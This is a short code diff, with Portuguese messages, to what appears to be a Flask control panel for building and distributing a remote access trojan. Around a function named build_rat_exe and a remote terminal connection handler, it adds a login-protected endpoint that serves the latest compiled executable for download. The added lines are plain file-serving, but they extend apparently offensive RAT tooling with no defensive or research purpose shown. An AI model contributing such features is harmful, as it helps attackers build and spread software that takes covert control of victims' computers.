@@ -516,6 +516,20 @@ def build_rat_exe():
         logger.error(f"[BUILD] Erro ao enviar arquivo: {e}")
         return jsonify({"error": str(e)}), 500
 
+@app.route('/api/download', methods=['GET'])
+@require_login
+def download_exe():
+    """Download direto do ultimo .exe compilado"""
+    from pathlib import Path
+    dist_dir = Path(app.root_path) / 'dist'
+    candidates = list(dist_dir.glob('progam*'))
+    if not candidates:
+        return jsonify({"error": "Nenhum .exe compilado. Clique em BUILD primeiro."}), 404
+    latest = max(candidates, key=lambda p: p.stat().st_mtime)
+    logger.info(f"[DOWNLOAD] Servindo {latest.name}")
+    return send_from_directory(str(dist_dir), latest.name, as_attachment=True)
+
+
 @socketio.on('terminal_connect')
 def on_terminal_connect(data):
     """Cliente conecta ao terminal"""
